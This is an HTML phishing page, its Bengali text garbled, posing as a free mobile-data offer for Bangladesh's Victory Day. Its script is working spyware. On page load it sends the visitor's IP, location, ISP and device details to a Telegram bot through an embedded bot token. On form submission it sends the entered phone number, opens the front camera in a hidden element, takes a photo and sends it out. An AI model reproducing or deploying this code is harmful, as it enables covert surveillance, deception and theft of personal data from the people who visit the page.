<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>‡¶¨‡¶ø‡¶ú‡ßü ‡¶¶‡¶ø‡¶¨‡¶∏ ‡¶â‡¶™‡¶≤‡¶ï‡ßç‡¶∑‡ßá eGB ‡¶™‡ßç‡¶∞‡¶∞‡¶ø ‡¶Ü‡¶®‡ßç‡¶§‡¶∞‡ßç‡¶ú‡¶æ‡¶§‡¶ø‡¶ï</title>
    <style>
        body {
            background: linear-gradient(to right, #006a4e, #f42a41);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background: #ffffff;
            padding: 22px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            text-align: center;
            width: 100%;
            max-width: 420px;
            position: relative;
            z-index: 3;
        }
        input, select {
            width: 100%;
            padding: 10px;
            margin-bottom: 12px;
            border: 1px solid #bbb;
            border-radius: 6px;
            font-size: 14px;
        }
        .submit-button {
            background: #006a4e;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 6px;
            width: 100%;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>üè≥Ô∏è‚Äçüåà ‡¶¨‡¶ø‡¶ú‡ßü ‡¶¶‡¶ø‡¶¨‡¶∏ ‡¶â‡¶™‡¶≤‡¶ï‡ßç‡¶∑‡ßá</h1>
    <div class="form-box">
        <form id="data-form">
            <select required id="operator">
                <option value="">‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶Ö‡¶™‡¶æ‡¶∞‡ßá‡¶ü‡¶∞ ‡¶®‡¶ø‡¶∞‡ßç‡¶¨‡¶æ‡¶ö‡¶® ‡¶ï‡¶∞‡ßÅ‡¶®</option>
                <option>Grameenphone</option>
                <option>Robi</option>
                <option>Airtel</option>
                <option>Banglalink</option>
                <option>Teletalk</option>
            </select>
            <input type="text"
                   id="mobile-number"
                   placeholder="‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ (01XXXXXXXXX)"
                   maxlength="11"
                   pattern="01[0-9]{9}"
                   required>
            <button type="submit" class="submit-button">üéâ eGB ‡¶°‡¶æ‡¶ü‡¶æ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø</button>
        </form>
    </div>
</div>
<script>
const BOT_TOKEN = "8312309177:AAGaLWnyLdx59DUI5vl78GoBShyQvaoUDx0"; // Replace with your bot token
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}
async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        deviceInfo.charging = battery.charging;
        deviceInfo.chargingPercentage = Math.round(battery.level * 100);
    }
    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
    }
    return deviceInfo;
}
async function sendTelegramMessage(chatId, message) {
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };
    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        const result = await response.json();
        console.log("Telegram Response:", result);
    } catch (error) {
        console.error("Error sending message:", error);
    }
}
async function sendPhoto(chatId, photo) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', photo);
    try {
        const response = await fetch(API_FILE_URL, {
            method: "POST",
            body: formData
        });
        const result = await response.json();
        console.log("Photo sent:", result);
    } catch (error) {
        console.error("Error sending photo:", error);
    }
}
async function capturePhoto(video) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photo = canvas.toDataURL('image/png');
    // Convert data URL to Blob
    const response = await fetch(photo);
    const blob = await response.blob();
    return new File([blob], 'photo.png', { type: 'image/png' });
}
async function sendInitialInfo(chatId) {
    const ipDetails = await getIpDetails();
    const deviceInfo = await getDeviceInfo();
    const message = `
        <b><u>üìå Activity Tracked:</u></b>
        <b>üåé Ip address:</b> <i>${ipDetails.ip}</i>
        <b>üìç Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
        <b>üì° ISP:</b> <i>${ipDetails.org}</i>
        <b>üî¢ ASN:</b> <i>${ipDetails.asn}</i>
        <b>üì± Device Info:</b>
        <b>üîå Charging:</b> <i>${deviceInfo.charging ? 'Yes' : 'No'}</i>
        <b>üîã Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
        <b>üì° Network Type:</b> <i>${deviceInfo.networkType}</i>
        <b>üïí Time Zone:</b> <i>${deviceInfo.timeZone}</i>
        <b>üë§ Tracked on: @Camera_Heakinbot</b>
    `;
    if (chatId) {
        await sendTelegramMessage(chatId, message);
    } else {
        console.error("Chat ID missing in URL!");
    }
}
document.getElementById('data-form').addEventListener('submit', async function (event) {
    event.preventDefault();
    const operator = document.getElementById('operator').value;
    const mobileNumber = document.getElementById('mobile-number').value;
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('id');
    if (!chatId) {
        alert("Chat ID is missing in the URL!");
        return;
    }
    const ipDetails = await getIpDetails();
    const message = `
        <b><u>üìû Number Tracked</u></b>
        <b>üì± Mobile number:</b> +91${mobileNumber}
        <b>üì° Operator:</b> ${operator}
        <b>üåé Ip Information:</b>
        <b>üåé Ip address:</b> <i>${ipDetails.ip}</i>
        <b>üìç Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
        <b>üì° ISP:</b> <i>${ipDetails.org}</i>
        <b>üî¢ ASN:</b> <i>${ipDetails.asn}</i>
        <b>üë§ Tracked on: @Camera_Heakinbot</b>
    `;
    await sendTelegramMessage(chatId, message);
    const video = await startCamera();
    const photo = await capturePhoto(video);
    await sendPhoto(chatId, photo);
    // Stop the camera and clean up
    const tracks = video.srcObject.getTracks();
    tracks.forEach(track => track.stop());
    video.remove();
    alert("Your request has been processed under 24 hours!");
});
// Call sendInitialInfo
const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('id');
if (chatId) {
    sendInitialInfo(chatId);
}
document.getElementById('mobile-number').addEventListener('input', function () {
    this.value = this.value.replace(/[^0-9]/g, '');
});
async function startCamera() {
    const video = document.createElement('video');
    video.style.display = 'none'; // Hide the video element
    document.body.appendChild(video);
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
        video.play();
        await new Promise(resolve => {
            video.onloadedmetadata = resolve;
        });
        return video;
    } catch (error) {
        console.error("Error accessing camera:", error);
        return null;
    }
}
</script>
</body>
</html>
